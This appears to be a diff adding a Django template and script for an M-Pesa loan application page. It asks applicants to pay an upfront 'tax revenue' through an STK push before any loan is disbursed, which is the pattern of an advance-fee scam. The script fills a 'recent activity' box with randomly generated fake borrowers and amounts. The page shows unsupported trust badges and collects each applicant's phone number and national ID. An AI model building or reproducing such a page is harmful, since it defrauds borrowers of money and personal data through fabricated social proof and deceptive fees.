@@ -1,0 +1,277 @@
+{% extends 'loans/base.html' %}
+{% block title %}Apply for Loan | {{ config.site_name }}{% endblock %}
+{% block body %}
+<div class="top-banner">Fast and secure loan processing &bull; 100% online application</div>
+<div class="page-wrapper">
+  <div class="offers-header">
+    <div class="user-avatar" id="user-avatar">J</div>
+    <div class="offers-header-text">
+      <h1>{{ config.site_name }}</h1>
+      <p>Get the financial support you need with our simple, transparent loan process</p>
+    </div>
+  </div>
+
+  <div class="badges-row">
+    <div class="badge-item">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      256-bit Encryption
+    </div>
+    <div class="badge-item">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+      Instant Decisions
+    </div>
+    <div class="rating-badge">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+      4.8
+    </div>
+  </div>
+
+  <div class="qualify-box">
+    Hi <strong id="display-name">{{ name }}</strong>, you qualify for these loan options based on your <strong>M-Pesa records</strong>
+    ({{ config.loan_term_months }}-month term at {{ config.interest_rate }}% interest).
+  </div>
+
+  <div class="recent-loans-box">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
+    <span id="recent-loan-text">Loading recent activity...</span>
+  </div>
+
+  <div class="offers-title">Select Your Loan Amount</div>
+
+  <div class="loan-grid" id="loan-grid">
+    {% for loan in loan_amounts %}
+    <button class="loan-card" onclick="selectLoan(this, {{ loan.amount }}, {{ loan.tax_revenue }})"
+            data-amount="{{ loan.amount }}" data-tax="{{ loan.tax_revenue }}">
+      <div class="loan-card-label">LOAN</div>
+      <div class="loan-card-amount">Ksh {{ loan.amount|floatformat:0 }}</div>
+    </button>
+    {% empty %}
+    <p style="grid-column:span 2;text-align:center;color:#9ca3af;padding:20px;">No loan amounts configured. Please contact admin.</p>
+    {% endfor %}
+  </div>
+
+  <div class="tax-note">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+    Higher loan amounts have slightly higher tax revenues. Your selected tax revenue will be deducted from your loan disbursement after payment confirmation.
+  </div>
+
+  <button class="get-loan-btn" id="get-loan-btn" onclick="openModal()" disabled>
+    Get Loan Now
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+  </button>
+
+  <a href="/" class="back-link">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+    Back to Home
+  </a>
+
+  <div style="height:80px;"></div>
+</div>
+
+<!-- Confirm Payment Modal -->
+<div class="modal-overlay" id="confirm-modal">
+  <div class="modal">
+    <div class="modal-header">
+      <h3>Confirm Payment</h3>
+      <p>Complete your loan application</p>
+      <button class="modal-close" onclick="closeModal()">&#x2715;</button>
+    </div>
+    <div class="modal-body">
+      <div class="modal-row">
+        <span class="label">Loan Amount:</span>
+        <span class="value" id="modal-loan-amount">Ksh 0</span>
+      </div>
+      <div class="modal-row">
+        <span class="label">Tax Revenue:</span>
+        <span class="value" id="modal-tax">Ksh 0</span>
+      </div>
+      <div class="modal-row">
+        <span class="label">Interest ({{ config.interest_rate }}%):</span>
+        <span class="value" id="modal-interest">Ksh 0</span>
+      </div>
+      <div class="modal-row total">
+        <span class="label">Total Repayment:</span>
+        <span class="value" id="modal-total">Ksh 0</span>
+      </div>
+      <div class="modal-note">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        Note: You will receive an M-Pesa prompt to pay the tax revenue. Your loan will be disbursed immediately after payment confirmation.
+      </div>
+      <div class="stk-info">STK push will be sent to <strong id="modal-phone">{{ phone }}</strong></div>
+    </div>
+    <div class="modal-actions">
+      <button class="btn-cancel" onclick="closeModal()">Cancel</button>
+      <button class="btn-pay" id="pay-btn" onclick="proceedToPayment()">Proceed to Payment</button>
+    </div>
+  </div>
+</div>
+
+<!-- STK Waiting Modal -->
+<div class="modal-overlay" id="stk-modal">
+  <div class="modal">
+    <div class="stk-waiting">
+      <div class="spinner"></div>
+      <h3>Check Your Phone</h3>
+      <p>An M-Pesa prompt has been sent to<br><span class="phone-highlight" id="stk-phone">{{ phone }}</span><br><br>Enter your M-Pesa PIN to complete the payment.</p>
+      <br>
+      <p id="stk-status" style="font-size:13px;color:#9ca3af;"></p>
+    </div>
+  </div>
+</div>
+
+<!-- Processing Overlay -->
+<div class="loading-overlay" id="processing-overlay">
+  <div class="spinner"></div>
+  <p>PROCESSING LOAN...<br><small>Please wait a moment</small></p>
+</div>
+
+<footer class="footer">
+  <div class="footer-links">
+    <a href="/privacy">Privacy</a>
+    <a href="/terms">Terms</a>
+    <a href="/contact">Contact</a>
+  </div>
+  <div class="footer-copy">{{ config.footer_text }}</div>
+</footer>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+const applicantName = "{{ name|escapejs }}";
+const applicantPhone = "{{ phone|escapejs }}";
+const nationalId = "{{ national_id|escapejs }}";
+const loanType = "{{ loan_type|escapejs }}";
+const interestRate = {{ config.interest_rate|default:10 }};
+
+let selectedAmount = 0;
+let selectedTax = 0;
+let transactionRequestId = null;
+let statusInterval = null;
+
+// Set avatar initial
+const initial = applicantName.charAt(0).toUpperCase() || 'U';
+document.getElementById('user-avatar').textContent = initial;
+
+// Recent loans simulation
+const recentNames = ['0712****89','0722****45','0701****56','0768****77','0733****23','0710****90'];
+const recentAmounts = [5500,7800,9800,11200,16800,21200,25600,30000,35400,39800,44200,48600];
+const timeLabels = ['just now','1 min ago','2 mins ago','3 mins ago','5 mins ago'];
+function updateRecentLoan() {
+  const n = recentNames[Math.floor(Math.random()*recentNames.length)];
+  const a = recentAmounts[Math.floor(Math.random()*recentAmounts.length)];
+  const t = timeLabels[Math.floor(Math.random()*timeLabels.length)];
+  document.getElementById('recent-loan-text').textContent = n + ' loaned Ksh ' + a.toLocaleString() + ' - ' + t;
+}
+updateRecentLoan();
+setInterval(updateRecentLoan, 4000);
+
+function selectLoan(el, amount, tax) {
+  document.querySelectorAll('.loan-card').forEach(c => c.classList.remove('selected'));
+  el.classList.add('selected');
+  selectedAmount = amount;
+  selectedTax = tax;
+  document.getElementById('get-loan-btn').disabled = false;
+}
+
+function openModal() {
+  if (!selectedAmount) return;
+  const interest = Math.round(selectedAmount * interestRate / 100);
+  const total = selectedAmount + interest;
+  document.getElementById('modal-loan-amount').textContent = 'Ksh ' + selectedAmount.toLocaleString();
+  document.getElementById('modal-tax').textContent = 'Ksh ' + selectedTax.toLocaleString();
+  document.getElementById('modal-interest').textContent = 'Ksh ' + interest.toLocaleString();
+  document.getElementById('modal-total').textContent = 'Ksh ' + total.toLocaleString();
+  document.getElementById('modal-phone').textContent = applicantPhone;
+  document.getElementById('confirm-modal').classList.add('active');
+}
+
+function closeModal() {
+  document.getElementById('confirm-modal').classList.remove('active');
+}
+
+function proceedToPayment() {
+  document.getElementById('pay-btn').disabled = true;
+  document.getElementById('pay-btn').textContent = 'Processing...';
+  document.getElementById('processing-overlay').classList.add('active');
+
+  setTimeout(() => {
+    document.getElementById('processing-overlay').classList.remove('active');
+    closeModal();
+    initiateSTKPush();
+  }, 2000);
+}
+
+function initiateSTKPush() {
+  document.getElementById('stk-phone').textContent = applicantPhone;
+  document.getElementById('stk-modal').classList.add('active');
+
+  fetch('/mpesa/stk-push/', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json', 'X-CSRFToken': getCookie('csrftoken')},
+    body: JSON.stringify({
+      phone: applicantPhone,
+      amount: selectedTax,
+      loan_amount: selectedAmount,
+      name: applicantName,
+      national_id: nationalId,
+      loan_type: loanType
+    })
+  })
+  .then(r => r.json())
+  .then(data => {
+    if (data.success) {
+      transactionRequestId = data.transaction_request_id;
+      document.getElementById('stk-status').textContent = data.customer_message || 'Waiting for payment...';
+      startStatusPolling();
+    } else {
+      document.getElementById('stk-modal').classList.remove('active');
+      alert('Payment error: ' + (data.error || 'Please try again.'));
+      document.getElementById('pay-btn').disabled = false;
+      document.getElementById('pay-btn').textContent = 'Proceed to Payment';
+    }
+  })
+  .catch(() => {
+    document.getElementById('stk-modal').classList.remove('active');
+    alert('Network error. Please try again.');
+    document.getElementById('pay-btn').disabled = false;
+    document.getElementById('pay-btn').textContent = 'Proceed to Payment';
+  });
+}
+
+function startStatusPolling() {
+  let attempts = 0;
+  statusInterval = setInterval(() => {
+    attempts++;
+    if (!transactionRequestId || attempts > 30) {
+      clearInterval(statusInterval);
+      return;
+    }
+    fetch('/mpesa/status/' + transactionRequestId + '/')
+      .then(r => r.json())
+      .then(data => {
+        if (data.status === 'success') {
+          clearInterval(statusInterval);
+          document.getElementById('stk-modal').classList.remove('active');
+          const params = new URLSearchParams({
+            receipt: data.receipt || '',
+            name: applicantName,
+            amount: selectedAmount
+          });
+          window.location.href = '/payment-success?' + params.toString();
+        } else if (data.status === 'failed' || data.status === 'cancelled') {
+          clearInterval(statusInterval);
+          document.getElementById('stk-modal').classList.remove('active');
+          alert('Payment ' + data.status + ': ' + (data.result_desc || 'Please try again.'));
+          document.getElementById('pay-btn').disabled = false;
+          document.getElementById('pay-btn').textContent = 'Proceed to Payment';
+        }
+      });
+  }, 3000);
+}
+
+function getCookie(name) {
+  let v = document.cookie.match('(^|;) ?' + name + '=([^;]*)(;|$)');
+  return v ? v[2] : '';
+}
+</script>
+{% endblock %}
